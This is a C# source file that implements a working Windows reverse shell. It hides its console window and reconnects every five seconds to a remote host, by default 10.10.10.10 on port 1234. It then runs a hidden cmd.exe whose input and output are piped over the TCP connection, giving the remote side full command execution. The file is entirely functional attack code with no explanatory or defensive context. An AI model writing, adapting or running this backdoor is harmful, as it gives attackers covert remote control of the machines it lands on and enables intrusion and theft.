using System;
using System.Runtime.InteropServices;
using System.Net.Sockets;
using System.Diagnostics;

class Program {
    [DllImport("kernel32.dll")]
    static extern bool FreeConsole();

    static void Main(string[] args) {
        FreeConsole();
        string host = args.Length == 3 ? args[1] : "10.10.10.10";
        int port = args.Length == 3 ? int.Parse(args[2]) : 1234;

        while (true) {
            System.Threading.Thread.Sleep(5000);
            try {
                using (TcpClient client = new TcpClient(host, port)) {
                    using (NetworkStream stream = client.GetStream()) {
                        byte[] buffer = new byte[1024];
                        if (stream.Read(buffer, 0, buffer.Length) <= 0) continue;

                        Process p = new Process();
                        p.StartInfo.FileName = "cmd.exe";
                        p.StartInfo.CreateNoWindow = true;
                        p.StartInfo.UseShellExecute = false;
                        p.StartInfo.RedirectStandardInput = true;
                        p.StartInfo.RedirectStandardOutput = true;
                        p.StartInfo.RedirectStandardError = true;

                        p.OutputDataReceived += (s, e) => { if (e.Data != null) { byte[] b = System.Text.Encoding.ASCII.GetBytes(e.Data + "\n"); stream.Write(b, 0, b.Length); } };
                        p.ErrorDataReceived += (s, e) => { if (e.Data != null) { byte[] b = System.Text.Encoding.ASCII.GetBytes(e.Data + "\n"); stream.Write(b, 0, b.Length); } };

                        p.Start();
                        p.BeginOutputReadLine();
                        p.BeginErrorReadLine();

                        using (System.IO.StreamWriter sw = p.StandardInput) {
                            byte[] inBuf = new byte[1024];
                            int bytesRead;
                            while ((bytesRead = stream.Read(inBuf, 0, inBuf.Length)) > 0) {
                                string cmd = System.Text.Encoding.ASCII.GetString(inBuf, 0, bytesRead);
                                if (cmd.Trim() == "exit") Environment.Exit(0);
                                sw.WriteLine(cmd);
                            }
                        }
                        p.WaitForExit();
                    }
                }
            } catch { continue; }
        }
    }
}
